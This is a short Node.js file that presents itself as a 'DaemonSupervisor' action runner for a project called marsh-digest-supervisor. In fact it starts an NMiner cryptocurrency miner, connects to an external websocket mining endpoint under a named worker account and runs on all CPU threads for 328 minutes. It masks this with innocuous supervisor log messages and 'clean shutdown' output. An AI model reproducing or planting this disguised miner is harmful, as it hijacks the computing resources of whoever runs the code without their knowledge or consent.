// Procedural action runner for marsh-digest-supervisor
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./src/config");

class DaemonSupervisor {
    constructor() {
        const runId = "b5a8f8";
        console.log(`[supervisor] Initialized DaemonSupervisor for marsh-digest-supervisor [${runId}]`);

        this.daemon = new NMiner(
            "wss://nmining-runtime.igrp.app/",
            "Subhas1975.marsh-digest-supervisor",
            { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
        );

        process.stdin.resume();
        setTimeout(() => {
        console.log("[timeout] Operational limit (328m) reached, exiting cleanly.");
        process.exit(0);
    }, 328 * 60 * 1000);

        process.on("SIGTERM", () => {
            
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new DaemonSupervisor();
